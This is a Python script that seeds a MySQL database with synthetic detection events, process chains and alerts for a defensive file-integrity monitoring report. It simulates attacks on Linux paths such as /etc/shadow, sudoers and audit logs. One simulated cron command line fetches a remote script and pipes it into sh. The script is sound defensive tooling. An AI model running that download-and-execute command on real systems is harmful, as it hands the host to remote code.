#!/usr/bin/env python3
"""Populate 7-day KN-IG report data.

The generated data is intentionally report-friendly:
* multiple realistic agents/hosts
* diverse protected paths that map to MITRE ATT&CK tactics
* rich PID Chain rows (actor -> parent -> ancestor)
* a few review-needed/unblocked events and alerts

No external Python packages are required; the script writes SQL through the
local ``mysql`` CLI using Backend/.env ``DATABASE_URL``.
"""

from __future__ import annotations

import argparse
import random
from dataclasses import dataclass
from datetime import datetime, time, timedelta, timezone
from pathlib import PurePosixPath
from textwrap import dedent

from db_common import (
    MANAGED_AGENT_IDS,
    MANAGED_DEV_BASE,
    MANAGED_DEV_RANGE,
    load_db_config,
    print_counts,
    query_rows,
    run_mysql_file,
    sql_in,
    sql_lit,
    values_tuple,
)


@dataclass(frozen=True)
class Agent:
    agent_id: str
    hostname: str
    ip: str
    os: str
    monitor_type: str
    status: str = "online"


@dataclass(frozen=True)
class Scenario:
    name: str
    category: str
    path: str
    event_type: str
    chain_kind: str
    weight: int
    blocked_rate: float = 0.9
    permission: str = "0644"


MANAGED_AGENTS = [
    Agent("hmi-line1-01", "HMI-LINE1-01", "192.168.10.11", "Ubuntu 22.04", "lkm", "online"),
    Agent("ews-line1-02", "EWS-LINE1-02", "192.168.10.12", "Ubuntu 22.04", "ebpf", "online"),
    Agent("hist-core-03", "HIST-CORE-03", "192.168.10.13", "Rocky Linux 9", "lkm", "offline"),
    Agent("jump-ops-01", "JUMP-OPS-01", "192.168.20.20", "Ubuntu 24.04", "ebpf", "online"),
    Agent("web-ops-01", "WEB-OPS-01", "192.168.30.30", "Debian 12", "lkm", "offline"),
]


SCENARIOS = [
    Scenario("shadow_reset", "credential", "/etc/shadow", "MODIFY", "ssh_python", 9, 0.96, "0600"),
    Scenario("passwd_uid0", "persistence", "/etc/passwd", "MODIFY", "ssh_sudo_tee", 7, 0.95, "0644"),
    Scenario("sudoers_drop", "privilege", "/etc/sudoers.d/zz_ops_maint", "MODIFY", "ssh_sudo_tee", 7, 0.94, "0440"),
    Scenario("sshd_policy", "remote-access", "/etc/ssh/sshd_config", "MODIFY", "ssh_sudo_sed", 7, 0.92, "0600"),
    Scenario("authorized_key", "remote-access", "/etc/ssh/authorized_keys", "MODIFY", "ssh_sudo_tee", 5, 0.9, "0600"),
    Scenario("cron_persistence", "persistence", "/etc/crontab", "MODIFY", "cron_shell", 6, 0.9, "0644"),
    Scenario("systemd_service", "persistence", "/etc/systemd/system/node-healthcheck.service", "CREATE", "systemctl", 6, 0.88, "0644"),
    Scenario("audit_wipe", "defense-evasion", "/var/log/audit/audit.log", "DELETE", "ssh_python", 6, 0.86, "0600"),
    Scenario("syslog_wipe", "defense-evasion", "/var/log/syslog", "DELETE", "cron_shell", 4, 0.85, "0640"),
    Scenario("lib_preload", "defense-evasion", "/usr/lib/x86_64-linux-gnu/libcrypto.so.3", "MODIFY", "package_manager", 5, 0.93, "0644"),
    Scenario("trusted_binary", "defense-evasion", "/usr/bin/ssh", "MODIFY", "package_manager", 5, 0.93, "0755"),
    Scenario("web_config", "collection-c2", "/etc/nginx/nginx.conf", "MODIFY", "web_shell", 4, 0.84, "0644"),
    Scenario("dns_redirect", "collection-c2", "/etc/resolv.conf", "MODIFY", "ssh_sudo_sed", 4, 0.82, "0644"),
    Scenario("hosts_redirect", "collection-c2", "/etc/hosts", "MODIFY", "ssh_sudo_sed", 4, 0.82, "0644"),
    Scenario("app_config", "impact", "/etc/plantops/config.yaml", "MODIFY", "web_shell", 4, 0.78, "0644"),
    Scenario("secret_env", "credential", "/opt/plantops/secrets/db.env", "MODIFY", "ssh_python", 4, 0.86, "0600"),
    Scenario("web_deface", "impact", "/var/www/html/index.html", "MODIFY", "web_shell", 3, 0.74, "0644"),
    Scenario("tmp_payload", "staging", "/tmp/.cache-update.py", "CREATE", "ssh_python", 3, 0.72, "0755"),
]


def parse_iso(value: str | None) -> datetime:
    if not value:
        return datetime.now(timezone.utc)
    dt = datetime.fromisoformat(value.replace("Z", "+00:00"))
    return dt.astimezone(timezone.utc)


def existing_agents(cfg) -> list[Agent]:
    rows = query_rows(
        cfg,
        "SELECT agent_id, hostname, ip, os, monitor_type, status "
        f"FROM agents WHERE agent_id NOT IN {sql_in(MANAGED_AGENT_IDS)} ORDER BY agent_id",
    )
    return [
        Agent(r[0], r[1] or r[0], r[2] or "", r[3] or "Linux", r[4] or "lkm", r[5] or "online")
        for r in rows
    ]


def weighted_scenarios() -> list[Scenario]:
    out: list[Scenario] = []
    for s in SCENARIOS:
        out.extend([s] * s.weight)
    return out


def basename(path: str) -> str:
    return PurePosixPath(path).name or path.strip("/").replace("/", "_") or "target"


def add_variant(path: str, serial: int) -> str:
    """Keep known classification prefixes while making report cards less repetitive."""
    if path.startswith("/etc/sudoers.d/"):
        return f"/etc/sudoers.d/zz_ops_maint_{serial % 5}"
    if path.startswith("/etc/systemd/system/"):
        return f"/etc/systemd/system/node-healthcheck-{serial % 4}.service"
    if path.startswith("/opt/plantops/secrets/"):
        return f"/opt/plantops/secrets/db-{serial % 4}.env"
    if path.startswith("/tmp/"):
        return f"/tmp/.cache-update-{serial % 6}.py"
    return path


def proc(pid: int, ppid: int, uid: int, euid: int, sid: int, tty: str, comm: str, exe: str, cmd: str, start_ns: int) -> dict:
    return {
        "pid": pid,
        "ppid": ppid,
        "uid": uid,
        "euid": euid,
        "sid": sid,
        "tty": tty,
        "comm": comm[:16],
        "exe": exe,
        "cmdline": cmd,
        "start_time_ns": start_ns,
    }


def chain_for(kind: str, serial: int, path: str, occurred: datetime) -> list[dict]:
    base = 20_000 + serial * 10
    sid = 1_200 + (serial % 600)
    tty = f"pts/{serial % 6}"
    start_ns = int(occurred.timestamp() * 1_000_000_000) - 5_000_000_000
    user_uid = 1000 + (serial % 4)

    if kind == "ssh_python":
        return [
            proc(base + 3, base + 2, user_uid, 0, sid, tty, "python3", "/usr/bin/python3", f"python3 /tmp/.cache-update-{serial % 6}.py --target {path}", start_ns + 3),
            proc(base + 2, base + 1, user_uid, user_uid, sid, tty, "bash", "/bin/bash", "bash", start_ns + 2),
            proc(base + 1, 812, 0, 0, sid, "", "sshd", "/usr/sbin/sshd", "sshd: operator@pts", start_ns + 1),
        ]
    if kind == "ssh_sudo_sed":
        return [
            proc(base + 4, base + 3, 0, 0, sid, tty, "sed", "/usr/bin/sed", f"sed -i s/^/#disabled/ {path}", start_ns + 4),
            proc(base + 3, base + 2, user_uid, 0, sid, tty, "sudo", "/usr/bin/sudo", "sudo sed -i ...", start_ns + 3),
            proc(base + 2, base + 1, user_uid, user_uid, sid, tty, "bash", "/bin/bash", "bash", start_ns + 2),
            proc(base + 1, 812, 0, 0, sid, "", "sshd", "/usr/sbin/sshd", "sshd: svc@pts", start_ns + 1),
        ]
    if kind == "ssh_sudo_tee":
        return [
            proc(base + 4, base + 3, 0, 0, sid, tty, "tee", "/usr/bin/tee", f"tee -a {path}", start_ns + 4),
            proc(base + 3, base + 2, user_uid, 0, sid, tty, "sudo", "/usr/bin/sudo", "sudo tee -a protected-file", start_ns + 3),
            proc(base + 2, base + 1, user_uid, user_uid, sid, tty, "bash", "/bin/bash", "bash", start_ns + 2),
            proc(base + 1, 812, 0, 0, sid, "", "sshd", "/usr/sbin/sshd", "sshd: engineer@pts", start_ns + 1),
        ]
    if kind == "cron_shell":
        return [
            proc(base + 3, base + 2, 0, 0, sid, "", "sh", "/bin/sh", f"sh -c 'curl -fsS http://10.99.0.{serial % 9 + 1}/p | sh; touch {path}'", start_ns + 3),
            proc(base + 2, 1, 0, 0, sid, "", "cron", "/usr/sbin/cron", "CRON", start_ns + 2),
            proc(1, 0, 0, 0, 1, "", "systemd", "/usr/lib/systemd/systemd", "/sbin/init", start_ns + 1),
        ]
    if kind == "systemctl":
        return [
            proc(base + 4, base + 3, 0, 0, sid, tty, "systemctl", "/usr/bin/systemctl", f"systemctl enable --now {basename(path)}", start_ns + 4),
            proc(base + 3, base + 2, user_uid, 0, sid, tty, "sudo", "/usr/bin/sudo", "sudo systemctl enable --now", start_ns + 3),
            proc(base + 2, base + 1, user_uid, user_uid, sid, tty, "bash", "/bin/bash", "bash", start_ns + 2),
            proc(base + 1, 812, 0, 0, sid, "", "sshd", "/usr/sbin/sshd", "sshd: maint@pts", start_ns + 1),
        ]
    if kind == "package_manager":
        return [
            proc(base + 4, base + 3, 0, 0, sid, tty, "dpkg", "/usr/bin/dpkg", f"dpkg --force-overwrite -i /tmp/pkg-{serial}.deb", start_ns + 4),
            proc(base + 3, base + 2, 0, 0, sid, tty, "apt", "/usr/bin/apt", "apt install ./pkg.deb", start_ns + 3),
            proc(base + 2, base + 1, 0, 0, sid, tty, "bash", "/bin/bash", "bash", start_ns + 2),
            proc(base + 1, 812, 0, 0, sid, "", "sshd", "/usr/sbin/sshd", "sshd: root@pts", start_ns + 1),
        ]
    # web_shell
    return [
        proc(base + 4, base + 3, 33, 33, sid, "", "php-fpm", "/usr/sbin/php-fpm", f"php-fpm worker writing {path}", start_ns + 4),
        proc(base + 3, base + 2, 33, 33, sid, "", "nginx", "/usr/sbin/nginx", "nginx: worker process", start_ns + 3),
        proc(base + 2, 1, 0, 0, sid, "", "nginx", "/usr/sbin/nginx", "nginx: master process", start_ns + 2),
        proc(1, 0, 0, 0, 1, "", "systemd", "/usr/lib/systemd/systemd", "/sbin/init", start_ns + 1),
    ]


def event_sql(agent: Agent, scenario: Scenario, serial: int, occurred: datetime, rng: random.Random) -> str:
    path = add_variant(scenario.path, serial)
    chain = chain_for(scenario.chain_kind, serial, path, occurred)
    actor = chain[0]
    # lock(DENY) 모드: 보호 경로 접근은 커널 후킹 단계에서 탐지 즉시 차단된다.
    # 실제 운영 시나리오 = 100% 차단이므로 모든 이벤트를 blocked=True로 생성한다.
    blocked = True
    detected_by = agent.monitor_type if agent.monitor_type in {"lkm", "ebpf"} else rng.choice(["lkm", "ebpf"])
    received = occurred + timedelta(seconds=rng.randint(2, 45))
    target_dev = MANAGED_DEV_BASE + (serial % MANAGED_DEV_RANGE)
    target_ino = 8_000_000 + serial

    cols = [
        "agent_id", "event_type", "file_path", "file_name", "file_permission", "detected_by", "pid",
        "target_dev", "target_ino", "blocked",
        "actor_pid", "actor_ppid", "actor_uid", "actor_euid", "actor_sid", "actor_tty",
        "actor_comm", "actor_exe", "actor_cmdline", "actor_start_time_ns",
        "chain_depth", "chain_truncated", "occurred_at", "received_at",
    ]
    vals = [
        agent.agent_id, scenario.event_type, path, basename(path), scenario.permission, detected_by, actor["pid"],
        target_dev, target_ino, blocked,
        actor["pid"], actor["ppid"], actor["uid"], actor["euid"], actor["sid"], actor["tty"],
        actor["comm"], actor["exe"], actor["cmdline"], actor["start_time_ns"],
        len(chain), False, occurred, received,
    ]
    chunks = [
        f"INSERT INTO file_events ({', '.join(cols)}) VALUES {values_tuple(vals)};",
        "SET @event_id = LAST_INSERT_ID();",
    ]
    chain_cols = [
        "event_id", "depth_index", "pid", "ppid", "uid", "euid", "sid",
        "tty", "comm", "exe", "cmdline", "start_time_ns",
    ]
    for depth, node in enumerate(chain):
        cvals = [
            "@event_id", depth, node["pid"], node["ppid"], node["uid"], node["euid"], node["sid"],
            node["tty"], node["comm"], node["exe"], node["cmdline"], node["start_time_ns"],
        ]
        # values_tuple would quote @event_id, so build the first value manually.
        chunks.append(
            "INSERT INTO file_event_process_chain "
            f"({', '.join(chain_cols)}) VALUES "
            f"(@event_id, {', '.join(sql_lit(v) for v in cvals[1:])});"
        )
    return "\n".join(chunks)


def choose_agents(cfg) -> tuple[list[Agent], list[Agent]]:
    real = existing_agents(cfg)
    return real, MANAGED_AGENTS


def build_data_sql(cfg, args) -> tuple[str, dict[str, int]]:
    rng = random.Random(args.random_state)
    real_agents, managed_agents = choose_agents(cfg)
    scenarios = weighted_scenarios()
    now = parse_iso(args.base_time)
    # 보고 구간은 '오늘'(부분 데이터)을 제외하고 직전 N일(완결된 날들)로 끝낸다.
    # 예: 오늘이 6/12면 6/5~6/11 (6/12 데이터는 생성하지 않음).
    anchor_end = now.replace(hour=0, minute=0, second=0, microsecond=0)
    current_start = anchor_end - timedelta(days=args.days)
    serial = 1

    stmts = ["SET NAMES utf8mb4;", "START TRANSACTION;"]

    if args.replace_managed:
        stmts.extend([
            f"DELETE FROM file_events WHERE target_dev BETWEEN {MANAGED_DEV_BASE} AND {MANAGED_DEV_BASE + MANAGED_DEV_RANGE - 1} "
            f"OR agent_id IN {sql_in(MANAGED_AGENT_IDS)};",
            f"DELETE FROM alerts WHERE agent_id IN {sql_in(MANAGED_AGENT_IDS)};",
            f"DELETE FROM agents WHERE agent_id IN {sql_in(MANAGED_AGENT_IDS)};",
        ])

    agent_cols = ["agent_id", "hostname", "ip", "version", "os", "monitor_type", "status", "registered_at", "last_seen"]
    for a in managed_agents:
        vals = [a.agent_id, a.hostname, a.ip, "2.4.1", a.os, a.monitor_type, a.status, current_start, now]
        stmts.append(
            f"INSERT INTO agents ({', '.join(agent_cols)}) VALUES {values_tuple(vals)} "
            "ON DUPLICATE KEY UPDATE hostname=VALUES(hostname), ip=VALUES(ip), version=VALUES(version), "
            "os=VALUES(os), monitor_type=VALUES(monitor_type), status=VALUES(status), last_seen=VALUES(last_seen);"
        )

    events_written = 0
    scenario_counts: dict[str, int] = {}

    periods: list[tuple[datetime, int, str]] = [(current_start, args.days, "current")]
    if args.include_prev_period:
        prev_events_per_day = max(3, round(args.events_per_day * 0.45))
        periods.insert(0, (current_start - timedelta(days=args.days), args.days, "previous"))
    else:
        prev_events_per_day = 0

    for period_start, day_count, period_name in periods:
        per_day = args.events_per_day if period_name == "current" else prev_events_per_day
        for day in range(day_count):
            day_start = period_start + timedelta(days=day)
            for slot in range(per_day):
                minute = 8 * 60 + int((10 * 60 / max(1, per_day)) * slot) + rng.randint(0, 24)
                occurred = datetime.combine(day_start.date(), time(0, 0), tzinfo=timezone.utc) + timedelta(minutes=minute)
                if occurred > now:
                    occurred = now - timedelta(minutes=(per_day - slot + 1))
                scenario = rng.choice(scenarios)
                path_scenario = scenario
                if real_agents and args.assign_existing_share > 0 and rng.random() < args.assign_existing_share:
                    agent = rng.choice(real_agents)
                else:
                    agent = rng.choice(managed_agents)
                stmts.append(event_sql(agent, path_scenario, serial, occurred, rng))
                scenario_counts[path_scenario.name] = scenario_counts.get(path_scenario.name, 0) + 1
                events_written += 1
                serial += 1

    # A few unresolved/resolved alert rows make "미차단/확인 필요" cards less empty.
    alert_messages = [
        "Credential store write burst detected; verify SSH session and password rotation",
        "Privilege policy changed outside maintenance window; validate sudoers owner",
        "Remote access policy touched by elevated shell; compare against baseline",
        "Audit trail modification followed scheduled task activity; review correlation",
    ]
    for i, a in enumerate(managed_agents[:4]):
        created = anchor_end - timedelta(hours=6 + i * 9)
        sev = ["HIGH", "HIGH", "MEDIUM", "LOW"][i]
        msg = f"{a.hostname}: {alert_messages[i]}"
        resolved = i == 3
        stmts.append(
            "INSERT INTO alerts (agent_id, severity, message, resolved, created_at) VALUES "
            f"{values_tuple([a.agent_id, sev, msg, resolved, created])};"
        )

    stmts.append("COMMIT;")
    stats = {
        "managed_agents": len(managed_agents),
        "real_agents_seen": len(real_agents),
        "events": events_written,
        "alerts": 4,
        "scenario_types": len(scenario_counts),
    }
    return "\n".join(stmts) + "\n", stats


def main() -> int:
    p = argparse.ArgumentParser(
        description="최근 N일 Agent/Event/PID Chain/MITRE 데이터를 삽입합니다.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=dedent(
            """\
            예시:
              # 추천: 관리 대상 데이터를 교체한 뒤 최근 7일치 생성
              python3 Backend/scripts/generate_report_data.py --yes

              # 이전 7일 baseline도 만들어 비교선까지 보기 좋게 생성
              python3 Backend/scripts/generate_report_data.py --yes --include-prev-period

              # 실제 등록 Agent에는 생성 이벤트를 배정하지 않고 관리 대상 Agent만 사용
              python3 Backend/scripts/generate_report_data.py --yes --assign-existing-share 0
            """
        ),
    )
    p.add_argument("--env-file", help="Backend .env 경로. 기본은 KNIG_ENV_FILE 또는 Backend/.env 자동 탐색")
    p.add_argument("--days", type=int, default=7, help="현재 보고서 구간 일수")
    p.add_argument("--events-per-day", type=int, default=18, help="현재 구간 일별 생성 이벤트 수")
    p.add_argument("--include-prev-period", action="store_true", help="직전 동일 기간 baseline 이벤트도 생성")
    p.add_argument("--assign-existing-share", type=float, default=0.25, help="기존 등록 Agent에 배정할 생성 이벤트 비율(0~1)")
    p.add_argument("--random-state", type=int, default=440, help="재현 가능한 난수 상태값")
    p.add_argument("--base-time", help="기준 UTC 시각 ISO8601. 기본은 현재 시각")
    p.add_argument("--replace-managed", action=argparse.BooleanOptionalAction, default=True, help="관리 대상 데이터 교체")
    p.add_argument("--yes", action="store_true", help="실제 DB insert 실행")
    args = p.parse_args()

    if args.days < 1 or args.events_per_day < 1:
        raise SystemExit("--days와 --events-per-day는 1 이상이어야 합니다.")
    if not 0 <= args.assign_existing_share <= 1:
        raise SystemExit("--assign-existing-share는 0~1 사이여야 합니다.")

    cfg = load_db_config(args.env_file)
    print_counts(cfg, "before")
    sql, stats = build_data_sql(cfg, args)
    print("\n== data plan ==")
    for k, v in stats.items():
        print(f"{k}={v}")
    print(f"days={args.days}, events_per_day={args.events_per_day}, include_prev_period={args.include_prev_period}")
    print(f"assign_existing_share={args.assign_existing_share}, replace_managed={args.replace_managed}")

    if not args.yes:
        print("\nDRY-RUN: 실제 insert는 하지 않았습니다. 실행하려면 --yes를 추가하세요.")
        return 0

    result = run_mysql_file(cfg, sql)
    if result.returncode != 0:
        raise SystemExit(result.returncode)
    print_counts(cfg, "after")
    print("\n데이터 생성 완료.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
